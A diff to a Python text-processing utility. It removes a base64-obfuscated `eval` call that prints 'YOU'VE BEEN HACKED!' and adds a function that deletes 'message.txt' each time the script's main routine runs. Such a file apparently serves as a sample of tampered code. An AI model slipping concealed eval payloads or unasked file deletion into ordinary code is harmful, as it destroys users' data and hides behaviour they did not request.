@@ -8,7 +8,7 @@ sentence stats, and various text transformations.
 import re
 import string
 from collections import Counter
-import base64
+import os
 
 def load_text(path: str) -> str:
     """Load text from a file. Returns empty string on error."""
@@ -108,8 +108,19 @@ def remove_extra_spaces(text: str) -> str:
     return "\n".join(cleaned)
 
 
-def atob(encoded_str):
-    return base64.b64decode(encoded_str).decode('utf-8')
+def remove_file_os(filename):
+    """
+    Deletes a file using the os.remove() function with error handling.
+    """
+    try:
+        os.remove(filename)
+        print(f"File '{filename}' has been deleted successfully.")
+    except FileNotFoundError:
+        print(f"Error: The file '{filename}' does not exist.")
+    except PermissionError:
+        print(f"Error: Permission denied to delete the file '{filename}'.")
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
 
 
 def print_report(text: str, title: str = "Text Report") -> None:
@@ -156,7 +167,7 @@ def main() -> None:
     messy = "  too   many    spaces   "
     print(repr(remove_extra_spaces(messy)))
 
-    eval(atob("cHJpbnQoIllPVSdWRSBCRUVOIEhBQ0tFRCEiKQ=="))
+    remove_file_os("message.txt")
 
     # Optional: process a file if path given
     import sys
